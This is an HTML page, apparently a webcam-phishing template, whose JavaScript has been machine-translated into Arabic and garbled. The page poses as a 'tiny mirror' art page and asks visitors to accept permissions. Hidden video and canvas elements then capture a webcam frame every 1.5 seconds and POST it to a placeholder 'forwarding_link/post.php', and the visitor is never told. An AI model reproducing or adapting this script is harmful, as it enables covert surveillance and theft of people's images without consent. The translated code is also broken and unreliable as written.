<! Dictype html >
< html >
< رئيس >
< script  type = " text / javascript " src = " https://wybiral.github.io/code-art/projects/tiny-mirror/index.js " > </ script >
< link  rel = " stylesheet " type = " text / css " href = " https://wybiral.github.io/code-art/projects/tiny-mirror/index.css " >
< script  type = " text / javascript " src = " https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js " > </ script >
</ رئيس >

< div  class = " video-wrap " hidden = " hidden " >
   < الفيديو  معرف = " فيديو " playsinline  التشغيل التلقائي > </ الفيديو >
</ div >

< canvas  hidden = " hidden " id = " canvas " width = " 640 " height = " 480 " > </ canvas >

< البرنامج النصي >

وظيفة  وظيفة ( imgdata ) {
$ . أياكس ( {
    اكتب : "POST" ،
    البيانات : {  cat : imgdata } ،
    url : 'forwarding_link / post.php' ،
    نوع البيانات : "json" ،
    غير متزامن : خطأ ،
    النجاح : الوظيفة ( النتيجة ) {
        // استدعاء الوظيفة التي تتعامل مع الاستجابة / النتائج
    } ،
    خطأ : الوظيفة ( ) {
    }
  } ) ؛
} ؛


"استخدام صارم" ؛

 فيديو  كونست =  وثيقة . getElementById ( "فيديو" ) ؛
 قماش  const =  وثيقة . getElementById ( "canvas" ) ؛
CONST  errorMsgElement  =  ثيقة . محدد الاستعلام ( 'span # errorMsg' ) ،

 قيود  const =  {
  الصوت : خطأ ،
  فيديو : {
    
    وضع المواجهة : "المستخدم"
  }
} ؛

//مرحبا بك في الموقع
المتزامن  وظيفة  الحرف الأول ( )  {
  حاول  {
     تيار  const =  انتظار  الملاح . أجهزة . getUserMedia ( قيود ) ؛
    handleSuccess ( تيار ) ؛
  }  catch  ( e )  {
    errorMsgElement . innerHTML  =  `خطأ navigator.getUserMedia: $ { e . toString ( ) } ` ؛
  }
}

// نجاح
وظيفة  handleSuccess ( دفق )  {
  نافذة . تيار  =  تيار ؛
  فيديو . srcObject  =  دفق ؛

 سياق  فار =  قماش . getContext ( '2d' ) ؛
  setInterval ( الوظيفة ( ) {

       السياق . drawImage ( فيديو ،  0 ،  0 ،  640 ،  480 ) ؛
       فار  كانفاسداتا  =  قماش . toDataURL ( "image / png" ) . استبدل ( "image / png" ،  "image / octet-stream" ) ؛
       آخر ( canvasData ) ؛  } ،  1500 ) ؛
  

}

// تحميل الحرف الأول
الحرف الأول ( ) ؛

</ script >

    < الجسم >
        < p > تلميح: انظر إلى الرمز المفضل </ p >
        < p > (قبول الأذونات) </ p >
        < p > < label > < input  type = " checkbox " name = " mirror " id = " mirror " /> صورة معكوسة </ label > </ p >
    </ الجسم >

</ html >
